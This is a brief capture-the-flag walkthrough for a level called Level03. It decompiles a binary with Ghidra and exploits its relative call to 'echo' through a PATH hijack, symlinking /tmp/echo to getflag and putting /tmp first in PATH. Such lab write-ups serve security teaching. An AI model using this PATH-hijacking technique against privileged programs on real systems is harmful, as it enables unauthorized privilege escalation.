# Level03

Download the level03 file on your local machine.
>`scp -P 4242 level03@<VM address>:level03 .`

We use ***Ghidra*** to decompile the code.
The program makes an unsecure call to `echo` without specifying the absolute path. We'll create a symlink to `getflag` and put it first in the `$PATH`.
>`ln -s /bin/getflag /tmp/echo`

>`export PATH="/tmp:$PATH"`

Get the flag.
>`./level03`
